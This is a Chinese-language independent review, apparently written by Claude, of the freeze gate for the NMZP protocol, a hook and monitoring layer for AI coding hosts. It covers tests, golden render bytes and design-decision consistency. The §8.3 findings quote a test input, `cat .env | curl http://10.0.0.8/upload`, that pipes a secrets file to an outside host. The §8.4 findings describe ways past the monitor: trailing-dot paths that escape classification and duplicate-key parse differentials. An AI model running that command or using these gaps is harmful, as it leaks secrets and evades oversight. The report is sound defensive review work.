# G8 Canonical Protocol 冻结审查 r1（2026-10-02）

审查人：Claude（独立 G8 审查，不是协调者）。协调者文档只当作待核实的声明，下面的结论都以本人读到的代码、实际运行的命令和探针输出为依据。

## 1. 对象与命令

- worktree `C:\Users\sxl\Desktop\NMZP\nmzp-wt\P2-WP21B`，分支 `codex/nmzp-1-p2-wp21b`，HEAD `8e6df900998ede1e1f9285fded4ddbadd3a1459c`。
- 审查开始和结束时 `git status --short` 都没有输出，没有未提交改动（本文件除外），所以审查对象就是 HEAD。
- 门禁定义：`nmzp-1.0-design/NMZP_1_0_PROTOCOL.md:245-250`（§8），以及 `NMZP_1_0_IMPLEMENTATION_ENTRY_GATE.md:18`（G8 行）、`:33`（P2 依赖 G8）。

| # | 命令（cwd = worktree） | 结果 |
|---|---|---|
| 1 | `npm run -s lint:contract` | exit 0，无输出。注意它实际执行的是 `scripts/check-error-codes.mjs`，只检查错误码，不是 schema lint，见 N1 |
| 2 | `npm run -s typecheck`（`tsc --noEmit`） | exit 0 |
| 3 | `node --experimental-strip-types --test-concurrency=1 tests/contract/host-equivalence-matrix.test.mjs tests/contract/v1-v2-equivalence.test.mjs tests/contract/render-golden.test.mjs` | 37 pass / 0 fail / 0 skipped |
| 4 | 追加定向：`node --experimental-strip-types --test tests/contract/schema-lint.test.mjs` | 9 pass / 0 fail（单个只读测试文件，不是全量 npm test） |
| 5 | 临时探针 A：`core/*.tmp.mts`，对比 `aec316e`（main，0.2.6）的 `core/hook-protocol.ts` 解析器和 HEAD 解析器，输入为 golden 中的 alias-conflict / truncated 用例，外加一个 contents/content 冲突用例 | 见 §8.3；已删除 |
| 6 | 临时探针 B：`g8-trim-probe.tmp.mts`，9 个路径变体走 `toCanonicalToolEvent → canonicalToEvalInput → evaluate(enforcing)` | 见 §8.4；已删除 |
| 7 | 只读 `git -C <wt> log/diff/show/status` 若干次（未逐次计数），包括 `git diff 6e0c1b5 8e6df90 --stat` 和对应源码 diff | — |

没有运行全量 `npm test`。没有联网，没有读取 `.env*`、`~/.ssh` 或凭据文件。两个探针删除后 `git status` 无残留。

## 2. 逐项判定

### §8.1 JSON Schema lint + fixtures：有条件满足

- 真正的 schema lint 是 `tests/contract/schema-lint.test.mjs` 配合 `protocol-checks.mjs:311` 的 `createAjv`：Ajv2020 8.20.0，`strict:true`，`strictRequired:false`，`strictTypes:false`。本次运行 9/9 通过。
- 闭合对象普查结果为 `{closed:78, map:0, v1Shape:4}`。manifest 有 40 个 valid 和 74 个 invalid fixture，另有 `contract/protocol/fixtures/cross-field/cases.json` 的 91 个交叉字段用例。
- 条件一：11 个 schema 没有 manifest fixture：evaluate-request-v2、-strict、response-v2、rewrite-layout、compact-rendered-rewrite、rendered-rewrite-evidence、rewrite-replay-witness、upload-size、heartbeat-request、receipt-request、backfill-request。它们只在其他测试里用内联对象覆盖，与 §8.1 "附带示例 fixtures" 的字面要求有差距（N2）。
- 条件二：`canonical-rewrite.schema.json:5` 自述 "D5 is UNIMPLEMENTED … not a complete contents-leaf rewrite contract"，运行时用的是占位值（B2）。这个 schema 的 lint 能过，但内容还不能冻结。
- 条件三：risk 枚举不一致（N3）。

### §8.2 13 宿主 ParseEvent 覆盖与 v1→v2 决策等价（IC-01 除外）：满足

- `host-equivalence-matrix.test.mjs` 本次运行通过。可运行的 101 个单元 v1 与 v2 全部相等，18 个 SKIPPED 都写明了理由（`:81-100`），我逐条读过，理由都是宿主不支持该工具形状或该路径，没有发现是在掩盖差异。
- `compare()`（`:244-290`）同时断言两侧 HTTP 200，以及 decision、ruleId、存储 risk 和 wireRisk（info→none）。比较的是引擎决策本身，不只是状态码。
- `:47-48` 在 RULES 出现 confirm 时直接抛错。`KNOWN_IC_01`（`:107-111`）在 `IC_01_SWITCHED=false` 下也断言相等，IC-01 没有被偷偷切换。
- `v1-v2-equivalence.test.mjs` 遍历 `policy-spec/host-normalization/` 下的各宿主目录，每个样例都比较 `observe()` 与 v2 投影，并做 schema 校验。本次运行通过。
- 局限（不影响判定）：决策空间里没有真实的 ALLOW 单元（引擎只有在 intervention off 或 skipped 时才出 allow），也没有 confirm 单元（N4）。web-fetch 在不同宿主之间决策不同（N7）。

### §8.3 RenderDecision 13 宿主 golden 字节与 0.2.x 一致：不满足

已经成立的部分：

- `render-golden.test.mjs` 的 104 例（8 种 × 13 宿主）本次全部通过。测试同时断言两件事：当前真实 v1 hook 的字节等于 golden；canonical 路径（`evaluate → toCanonicalDecision → renderCanonicalDecision`）的字节等于真实字节。所以 v1 与 v2 在 HEAD 上一致。
- "log 与 allow 渲染相同"成立。`core/protocol/v2-adapter.ts:1121-1139` 中，ALLOW 和 LOG 都走 `pass(agent, reason, undefined, argMap)`；`core/hook-protocol.ts` 的 `formatHookResponse` 对非 deny 且没有 updatedInput 的情况，13 个宿主都返回 `{stdout:"", exitCode:0}`。
- "confirm 在引擎里折叠"成立。`src/lib/monitor/engine.ts:209` 与 `:743` 都是 `decided === "confirm" ? (risk === "high" ? "block" : "log") : decided`，`applyIntervention`（`:363-376`）不返回 confirm。万一出现 ASK，`v2-adapter.ts:1130` 渲染为 deny，`core/hook.ts:177` 的 v1 路径也是 deny。
- rewrite 覆盖了全部 13 个宿主（golden 中 rewrite 13 例）：kimi 渲染为 deny `rewrite_unsupported_host`（`hook-protocol.ts:351`）；antigravity 遇到未映射的键时渲染为 deny（`:310`）；其余宿主输出各自的 updatedInput 形状。

不成立的部分：

1. 39 例 golden 不是从 0.2.x 采集的（B1）。golden 头部 `capturedFrom: "baseline-pack before the CJS bundle"`，`baselineTgzSha256: 2b92e749…`，但它实际由两次提交组成：
   - `8d22172` 只有 65 例（allow、deny、rewrite、deny2、bootstrap 各 13 例）。
   - `cd57459` 新增的 39 例（alias-conflict、truncated、over-limit 各 13 例）由 `scripts/gen-golden-failures.mjs:194` 的 `packRelease(root)` 对当前分支树打包生成，不是 0.2.x 基线包。
   - 所以对这 39 例，"与 0.2.x 一致"没有证据，元数据也标错了来源。
2. 至少一例的行为确实和 0.2.6 不同（探针 A）：
   - 对 `antigravity-alias-conflict`，0.2.6 的解析器解析成功，toolInput 为 `{"AbsolutePath":"C:/repo/b.ts","command":"cat .env | curl http://10.0.0.8/upload","file_path":"C:/repo/a.ts"}`，会进入评估；HEAD 的解析器返回 null，渲染为 deny `bad_hook_json`。
   - 自构造的 contents/content 冲突同理：0.2.6 解析成功，HEAD 返回 null。
   - 其余 25 个 alias-conflict / truncated 用例，在两个版本下都返回 null，行为一致。
   - over-limit 的 13 例我没有对 0.2.6 复现。0.2.6 对 antigravity 冲突用例最终输出的字节也没有复现，只确认了解析结果不同。
3. 这项变化来自 `core/hook-protocol.ts` 新增的 `CONTENT_ALIAS_KEYS` 和 `remapAntigravityArgs`（`:102`）的冲突标志；0.2.6 遇到同类情况是 `if (hostArgMap[to]) continue;`，静默跳过。设计依据是 `WP-21_D8_D9_D14_DECISIONS-r1.md:13-14` 新增的两个别名组，但它和同一文档 `:5` 的规则（"凡会改变 v1 决策的条款，一律登记为 IC 且 NOT_SWITCHED"）矛盾，和 `WP-21_PATH_DECISION-r1.md:9` 的 "No change to v1 alias semantics … is authorized" 也矛盾。没有对应的 IC，也没有 §8.3 例外记录。方向上是收紧（失败关闭），安全上不构成回归，但 §8.3 明确要求 "与 0.2.x 完全一致（P2 属于纯重构）"。
4. 协调者的说法"宿主永不收到 ask"字面上不成立（N5）：
   - antigravity 的 rewrite 形状是 `{"decision":"ask","reason":"nmzp_rewrite","overwrite":…}`（`hook-protocol.ts:314`）。
   - cursor 的 rewrite 形状是 `{"permission":"ask",…,"updated_input":…}`（`:377`）。
   - 这些是 rewrite 的载体，字节与 golden 一致，不算回归。但在这两个宿主上，REWRITE 很可能会让宿主向用户弹出确认，HOST_REAL 未验证。D10 和静默策略的表述需要修正。

### §8.4 Kiro 窄审：有条件满足

- 审查已执行：`KIRO-Q2-FINAL.log`，kiro-cli 2.24.1，只读，exit 0，`KIRO-Q2-FINAL.sha` = 8e6df90。但实际使用的模型 UNVERIFIED，全部结论来自静态读码。
- 协调者探针 `KIRO-Q2-FINAL_PROBE.txt` 复现了 Q2-1、S1 和 Q2-2。单个 `true` 在 v2 被拒绝为 `input_truncated`。
- "trim 方向偏严"（DISPOSITION:11）对空白字符成立，我用探针 B 核实过：
  - `C:/repo/.claude/settings.json` 加尾随空格、前导空格或 NBSP 后，Eval 看到的仍是去空白后的路径，仍命中 `agent_config_tamper`。
  - Linux 上带空白的路径是另一个文件，Windows 会把尾随空格规范化掉，两种情况下引擎都不会比真实路径更宽松。
  - 但 DISPOSITION 写的 "被 Win32 规范化成同一路径" 只覆盖空格，不覆盖尾随点。`C:/repo/.env.` 不命中任何规则（rule=null，risk=info），而 Win32 会把它解析为 `.env`；`.env` 本身命中 `sensitive_file_write`（medium）。
  - 在 enforcing 下两者的决策都是 log，所以拦截结果相同，差别在审计分类漏判。这是引擎路径匹配的问题，大概率早已存在（我没有对 0.2.6 复现），不属于 trim，也不属于 §8.4 的三项范围（N9）。
- "重复成员不构成绕过"（DISPOSITION:12）对信封级标志成立：`toolInputTruncated` 在 stdin 信封顶层，由宿主序列化产生，模型只能影响转义后的字符串值；能伪造信封的宿主本来就可以直接省略这个标记。
  - 没有讨论到的是 `tool_input` 内部的重复键（例如两个 `command`）。如果宿主把模型原始参数文本透传，而宿主执行器取第一个值、NMZP 的 `JSON.parse` 取最后一个，就形成解析差异。IC-10 关闭时 v1 和 v2 都接受这种输入，所以不是 v2 新增问题，但残余风险存在（N9）。
- 条件：
  - DISPOSITION:16-17 承认 Kiro 判定无问题的五个区域"协调者未逐项复核"。我读了别名冲突与 extraFields 相关代码，没有发现新问题，但也没有逐项构造探针。
  - S1 中真实 Qwen 同时收到两个字段时的优先级未验证。

### 设计决策一致性

- D1–D14 在 `DECISIONS_REQUIRED.md:5`、SEMANTIC r3、D8_D9_D14 r1/r2 和 `docs/design-review/WP-21_D11_D14_DECISIONS-r1.md` 中都已经由协调者选定。没有找到仍处于"待选方案"状态的 D 项。
- 与实现不一致的有：
  - **D5**：哈希预像与 patch 已选定，但没有实现（B2）。`core/protocol/v2-adapter.ts:996-1004` 与 `:1018-1026` 两个 REWRITE 分支都输出 `patches: []`、`rendererRevision: 0`，`baseInputHash` 与 `resultInputHash` 用 `dummyHash()`（`:484`，即 `sha256("")`），并且硬编码了 `validation.residueScan: "PASS"`。第二个分支的 `updatedFields` 还是 `{}`。`DECISIONS_REQUIRED.md:206`、`COORDINATOR_CHECKPOINT.md:12/82` 都写明 D5 未实现、是阻塞项。
  - **D8 别名组**：新增别名组却没有登记 IC，见 §8.3 第 3 点（B1）。
  - **`contract/protocol/DECISIONS_REQUIRED.md` 过期**，和 HEAD 以及已关闭的决策矛盾（B3）：
    - `:3` 写 "状态：OPEN"。
    - `:93` 写 "D13 仍 PENDING"，而 D11_D14 r1 已关闭。
    - `:109` 写 budget/no_cache NOT_RUN，这一点至今仍是事实，见 N8。
    - `:120-121` 写 D11 的版本范围与回执绑定 PENDING，而 D11_D14 r1 说回执绑定可以改为 PASS。
    - `:219` 写 "evaluate 仍未实现"，而 HEAD 已有 `/api/v2/evaluate` 路由。
  - **D10**："ASK 在 13 宿主渲染为 deny"成立，但"宿主不会收到 ask"的引申不成立（N5）。
- IC-01/02/10/11/12 在 HEAD 全部 NOT_SWITCHED（`DECISIONS_REQUIRED.md:153-197`；`V2_STRICT_INGRESS_DEFAULT = false`）。

### 性能 r2 是否适用于 8e6df90（不属于 §8，单列）

- `perf-r2-win-arm64/VERDICT.txt` 写明 `sha=6e0c1b56…`，allow、rewrite、probe 三项中位数分别是 1.0348、1.1220、1.0067，都不超过 1.20，判 PASS。
- 预声明（`WP-21_PERF_GATE_R2_PREDECLARATION.md`）规定"不同则作废"，所以这个 PASS 在形式上不适用于 8e6df90。`perf-r2-aborted-8e6df90/ABORTED.txt` 记录了在 8e6df90 上的那次运行中途停止、没有计入。
- `git diff 6e0c1b5 8e6df90` 涉及运行时代码的只有三处：
  - `core/protocol/device-binding.ts`（新增）。
  - `evaluate-ingress.ts:88` 把 `!==` 换成 `sameDeviceId`，多了一次 typeof 检查。
  - `core/serve.ts` 的 heartbeat、receipts、backfill 加了 `bindBodyDevice`。
- bench 脚本（`scripts/bench-evaluate-v2.mjs:35`）只压 `/api/{v1,v2}/evaluate`。按代码判断，实质性能影响可以忽略，但没有测量。CI 上的 ubuntu 与 windows 两个平台也还没跑（N11）。

## 3. 问题清单

### 阻断

- **B1 §8.3 缺少 0.2.x 基线，且 v1 别名语义变化没有登记 IC。**
  - 位置：`tests/compat/fixtures/hook-bytes-golden.json:2-3`；`scripts/gen-golden-failures.mjs:194`（提交 cd57459）；`core/hook-protocol.ts:20, 102`；`WP-21_D8_D9_D14_DECISIONS-r1.md:5` 对 `:13-14`；`WP-21_PATH_DECISION-r1.md:9`。
  - 原因：39 例 golden 来自分支树，不是 0.2.x，来源元数据错误；antigravity 别名冲突和 contents/content 冲突的 v1 行为相对 0.2.6 改变了，既违反 §8.3 的"纯重构"要求，也违反 D8 r1 自己定下的 IC 规则。
  - 修复：
    1. 用 `baselineTgzSha256` 指向的 0.2.x 包重新采集这 39 例，或者按用例标注真实来源。
    2. 有差异的用例，由用户决定是登记新的 IC，还是作为 §8.3 的显式例外接受。这是安全收紧，保留它是合理选项，但要有记录和批准。
    3. golden 测试对未变化的用例比较 0.2.x 字节，对 IC 或例外用例断言记录在案的预期差异。
- **B2 D5 未实现，CanonicalRewrite 输出占位证据。**
  - 位置：`core/protocol/v2-adapter.ts:484, 996-1004, 1018-1026`；`contract/protocol/schemas/canonical-rewrite.schema.json:5`。
  - 原因：PROTOCOL §4 的 patches、哈希和 validation 是协议主体。现在 schema 自述内容不完整，运行时输出 `sha256("")` 和硬编码的 `residueScan: "PASS"`。冻结这样一份合同，等于把占位值冻结成规范，而且 `validation` 会对一次没有发生的扫描声明 PASS。
  - 修复：二选一。实现 D5，并给 canonical-rewrite 加上 fixture 证明；或者把 CanonicalRewrite 明确排除在本次冻结之外，单独作为冻结批次，同时把占位的 `validation` 改为不声称 PASS 的值，并记录在案。
- **B3 合同包内的决策登记表过期，与 HEAD 矛盾。**
  - 位置：`contract/protocol/DECISIONS_REQUIRED.md:3, 93, 109, 120-121, 219`。
  - 原因：冻结对象就是 `contract/protocol/`。如果它自己的登记表写着 OPEN/PENDING 和"evaluate 未实现"，冻结范围就说不清楚。属于文档级问题，改起来成本低。

### 非阻断

- **N1** `package.json` 的 `lint:contract` 实际是 `scripts/check-error-codes.mjs`，不是 schema lint。schema lint 在 `tests/contract/schema-lint.test.mjs` 里。建议更名，或者把 schema lint 接入同一个脚本，避免把"lint:contract 通过"当成 §8.1 的证据。
- **N2** 上面列出的 11 个 schema 没有 manifest fixture（§8.1 条件一）。
- **N3** `PROTOCOL.md:83` 和 `canonical-decision.schema.json:54-61` 的 risk 枚举包含 `critical`，`canonical-evaluate-response-v2.schema.json:59-65` 不包含。`DECISIONS_REQUIRED.md:109` 写的是 "v2 risk 保持 …|critical"。要么统一，要么写明 response-v2 有意收窄。
- **N4** golden 和矩阵里都没有真实 ALLOW 或 ASK 的渲染用例。ALLOW≡LOG、ASK≡BLOCK 只能从代码结构推出（`v2-adapter.ts:1130-1138`），没有字节证据。
- **N5** "宿主永不收到 ask"需要更正：antigravity（`hook-protocol.ts:314`）和 cursor（`:377`）的 REWRITE 载体就是 ask 形状。宿主上的实际效果（是否弹窗）要等 HOST_REAL。
- **N6** rewrite golden 只覆盖 shell。file/url 字段通过 provenance 反向映射到 updatedInput 的渲染没有 golden。
- **N7** web-fetch 的决策跨宿主不一致：claude 和 qoder 是 BLOCK，antigravity 是 LOG。每个宿主内部 v1 与 v2 相等，所以不影响 §8.2。这属于 host-normalization 的语义问题。
- **N8** `core/hook.ts:587`（`no_cache_low_risk`）和 `:592`（`budget_low_risk`）两条 pass 路径没有任何 golden 或测试，`DECISIONS_REQUIRED.md:109` 自己也标着 NOT_RUN。
- **N9** §8.4 的残余风险：
  - 规则依赖首尾空白时，trim 会造成不一致。
  - Windows 尾随点 `.env.` 漏判分类（探针 B，enforcing 下决策同为 log）。
  - IC-10 关闭时，`tool_input` 内部的重复键可能形成宿主与 NMZP 的解析差异。
  - Kiro 的"无问题区域"没有经过复核。
  - Kiro 的模型 UNVERIFIED。
- **N10** `nmzp-wp21b-evidence/full-8e6df90/npm-test.txt`（2106 tests / 2063 pass / 0 fail / 43 skipped）文件里没有记录 SHA，只能从目录名推断。
- **N11** 性能 r2 的 PASS 只绑定 6e0c1b5 和 Windows ARM64 本机。8e6df90 需要按预声明重跑，CI 上的两个平台也待补跑。

## 4. 总判定：NOT_FREEZE

§8.1 有条件满足，§8.2 满足，§8.3 不满足，§8.4 有条件满足。B1–B3 需要先解决，其中 B1 和 B2 需要用户做出决策（登记 IC 或接受例外；冻结时包含还是排除 CanonicalRewrite），G8 审查人无权替用户决定。

B1–B3 处理完之后再提交 r2 复审，届时预计可以评估 FREEZE_WITH_CONDITIONS，条件会从 N2、N3、N8、N11 中选取。

## 5. 范围声明

- 本审查不包含 HOST_REAL：没有对任何真实宿主做验证，凡涉及宿主实际行为的部分都标为未验证。
- 本审查不批准任何 IC 开关（IC-01/02/10/11/12）切换。
- 本审查不批准部署、合并到 main 或推送。
- 本文是独立审查意见，不代替用户（Human）对 B1 和 B2 的决定。
